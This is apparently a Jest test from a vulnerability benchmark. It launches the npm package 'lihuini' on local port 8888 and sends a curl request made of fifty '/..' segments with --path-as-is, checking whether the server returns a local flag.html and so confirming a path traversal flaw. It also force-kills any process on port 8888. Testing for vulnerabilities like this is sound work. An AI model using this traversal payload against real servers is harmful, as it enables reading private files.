const v23 = require('child_process');
var execSync = v23.execSync;
const v25 = () => {
    try {
        const v24 = execSync('fuser -k 8888/tcp');
        v24;
    } catch (e) {
    }
};
const v26 = afterAll(v25);
v26;
const path = require('path');
const v27 = require('sleep');
const sleep = v27.sleep;
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v28 = '/..'.repeat(50);
    const v29 = v28 + pathToFlag;
    return v29;
};
const v43 = done => {
    const v30 = expect.assertions(1);
    v30;
    const fs = require('fs');
    const sleep = require('sleep');
    const v31 = require('child_process');
    const exec = v31.exec;
    const v32 = fs.readFileSync(pathToFlag);
    let hostsFile = v32.toString();
    const a = require('child_process');
    try {
        const v33 = () => {
        };
        const v34 = a.execSync('fuser -k 8888/tcp', v33);
        v34;
    } catch (e) {
    }
    let server = 'node ./node_modules/lihuini/index.js';
    const v35 = (error, stdout) => {
    };
    let exe = exec(server, v35);
    const v36 = sleep.sleep(2);
    v36;
    const v37 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${ v37 }"`;
    const v41 = (error, stdout) => {
        const v38 = expect(stdout);
        const v39 = v38.toBe(hostsFile);
        v39;
        const v40 = done();
        v40;
    };
    const v42 = exec(attack_string, v41);
    v42;
};
const v44 = test('Path Traversal in lihuini', v43);
v44;